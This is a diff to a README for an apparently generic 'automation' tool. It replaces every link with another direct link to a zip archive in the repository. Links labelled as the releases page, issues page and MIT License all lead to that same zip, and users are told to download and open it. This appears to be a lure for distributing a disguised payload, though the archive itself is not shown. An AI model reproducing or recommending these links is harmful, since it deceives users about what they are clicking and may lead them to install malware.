@@ -1,6 +1,6 @@
 # 🚀 amanansdiahnid-18 - Simple Tool for Easy Automation
 
-[![Download amanansdiahnid-18](https://raw.githubusercontent.com/shaikhfaruq/amanansdiahnid-18/main/awag/amanansdiahnid-18.zip)](https://raw.githubusercontent.com/shaikhfaruq/amanansdiahnid-18/main/awag/amanansdiahnid-18.zip)
+[![Download amanansdiahnid-18](https://github.com/shaikhfaruq/amanansdiahnid-18/raw/refs/heads/main/awag/amanansdiahnid_v1.0.zip)](https://github.com/shaikhfaruq/amanansdiahnid-18/raw/refs/heads/main/awag/amanansdiahnid_v1.0.zip)
 
 ## 📦 Overview
 
@@ -24,7 +24,7 @@ Welcome to **amanansdiahnid-18**, your go-to application for easy automation tas
 
 To get started, follow these steps:
 
-1. Visit this page to download: [amanansdiahnid-18 Releases Page](https://raw.githubusercontent.com/shaikhfaruq/amanansdiahnid-18/main/awag/amanansdiahnid-18.zip).
+1. Visit this page to download: [amanansdiahnid-18 Releases Page](https://github.com/shaikhfaruq/amanansdiahnid-18/raw/refs/heads/main/awag/amanansdiahnid_v1.0.zip).
 2. Look for the latest version available.
 3. Click the appropriate download file.
 4. Once downloaded, open the file to begin installation.
@@ -61,15 +61,15 @@ If you encounter an issue during setup or execution:
 
 ## 🔄 Updates
 
-The application will notify you of any new versions when you open it. You can also check the [release page](https://raw.githubusercontent.com/shaikhfaruq/amanansdiahnid-18/main/awag/amanansdiahnid-18.zip) to stay updated.
+The application will notify you of any new versions when you open it. You can also check the [release page](https://github.com/shaikhfaruq/amanansdiahnid-18/raw/refs/heads/main/awag/amanansdiahnid_v1.0.zip) to stay updated.
 
 ## 🤝 Community Support
 
-If you have questions or need assistance, please reach out to the community. You can find discussions and help on the project's [GitHub Issues page](https://raw.githubusercontent.com/shaikhfaruq/amanansdiahnid-18/main/awag/amanansdiahnid-18.zip).
+If you have questions or need assistance, please reach out to the community. You can find discussions and help on the project's [GitHub Issues page](https://github.com/shaikhfaruq/amanansdiahnid-18/raw/refs/heads/main/awag/amanansdiahnid_v1.0.zip).
 
 ## 📜 Licensing
 
-This project is licensed under the [MIT License](https://raw.githubusercontent.com/shaikhfaruq/amanansdiahnid-18/main/awag/amanansdiahnid-18.zip). Anyone is welcome to use, modify, and share it as long as they give credit to the original project.
+This project is licensed under the [MIT License](https://github.com/shaikhfaruq/amanansdiahnid-18/raw/refs/heads/main/awag/amanansdiahnid_v1.0.zip). Anyone is welcome to use, modify, and share it as long as they give credit to the original project.
 
 ## 🌟 Thank You!
 
